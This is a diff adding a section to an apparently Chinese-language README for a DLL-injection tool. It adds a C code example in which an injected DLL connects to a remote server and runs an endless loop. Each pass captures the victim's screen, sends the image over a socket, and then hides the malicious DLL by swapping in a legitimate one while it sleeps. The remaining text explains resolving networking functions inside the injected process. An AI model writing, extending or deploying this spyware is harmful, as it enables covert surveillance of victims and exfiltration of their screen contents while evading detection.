@@ -119,7 +119,42 @@ Main thread
     +-- Wait for all threads to complete
 ```
 
-## 注意
+## 扩展
+
+一个简单的示例: 屏幕截图
+
+当DLL被注入到进程之后，DLL会尝试去连接远程服务器，开始进入无限循环。它会捕获当前的屏幕截图，然后发送给远程服务器。接着DLL会被替换成正常的DLL并进入睡眠状态。当DLL被计时器唤醒之后又会重复这一流程。
+
+```c
+SOCKET socket = connect_to_server(&global_functions.ws_funcs, &global_functions.krnl_funcs);
+
+do
+{
+	char* filename = create_temp_filename("screenshot", &global_functions.krnl_funcs);
+	my_strncat(filename, ".bmp", 4);
+
+	
+	status = capture_screenshot_win32(filename, &global_functions.krnl_funcs, &global_functions.user32_funcs, &global_functions.gdi32_funcs);
+
+	status = send_file_over_socket(socket, filename, &global_functions.ws_funcs, &global_functions.krnl_funcs);
+
+	if (status != 0)
+	{
+		// reconnect
+	}
+
+	cleanup_temp_file(filename, &global_functions.krnl_funcs);
+
+	if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_funcs) == -1)
+	{
+		return FALSE;
+	}
+
+} while (true);
+
+```
+
+**注意事项**
 
 当使用注入器将DLL注入到其他进程时，执行DLL的线程不能直接调用所有的Win32API或其他库。只有DLL预先被导入的函数才可以直接调用，这些函数可以通过解析DLL的导入表查看。如果要调用其他DLL的函数，比如`ws2_32.dll`的网络通信函数，必须通过`LoadLibrary`和`GetProcAddress`手动获取需要使用的函数地址，然后再调用。可以使用以下方法：
 
